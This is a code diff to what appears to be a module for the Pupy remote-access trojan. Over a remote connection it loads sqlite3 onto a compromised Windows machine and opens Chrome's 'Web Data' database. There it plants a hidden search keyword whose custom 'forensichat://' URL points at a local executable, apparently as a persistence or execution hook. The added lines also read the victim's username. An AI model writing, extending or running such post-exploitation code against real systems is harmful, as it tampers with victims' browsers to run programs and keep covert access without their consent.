@@ -17,6 +17,8 @@
 
 from pupylib.PupyModule import *
 import os
+import StringIO
+from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="forensichatModule"
 
@@ -34,17 +36,28 @@ class forensichatModule(PupyModule):
 	def run(self, args):
 		self.info("a")
 		self.client.load_package("_sqlite3")
-		self.info("b")
-		con=self.client.conn.modules['_sqlite3'].connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
-		self.info("c")
-		self.info("connecting to web data db...")
-		c = con.cursor()
-		c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
-		foo = c.fetchall()
-		if foo == []:
-			c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
-			con.commit()
-		con.close()
+		self.client.load_package("sqlite3")
+		print self.client.load_dll("packages/windows/x86/sqlite3.dll")
+		
+		
+		self.client.conn.modules['_sqlite3']
+		self.client.conn.modules['sqlite3']
+		with redirected_stdio(self.client.conn): 
+
+			self.con=self.client.conn.modules['sqlite3'].connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
+			print self.con
+			self.info("connecting to web data db...")
+			self.c = self.con.cursor()
+			print self.c
+			self.c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
+			print self.c
+			self.foo = self.c.fetchall()
+			print self.foo
+			if not self.foo:
+				self.info("executing")
+				self.c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
+				self.con.commit()
+			self.con.close()
 
 
 		if args.clean:
@@ -54,3 +67,6 @@ class forensichatModule(PupyModule):
 			self.info("persist...")
 		
 		self.success("added browser")
+		self.client.load_package("getpass")
+		user=self.client.conn.modules['getpass'].getuser()
+		self.info("USER: %s"%user)
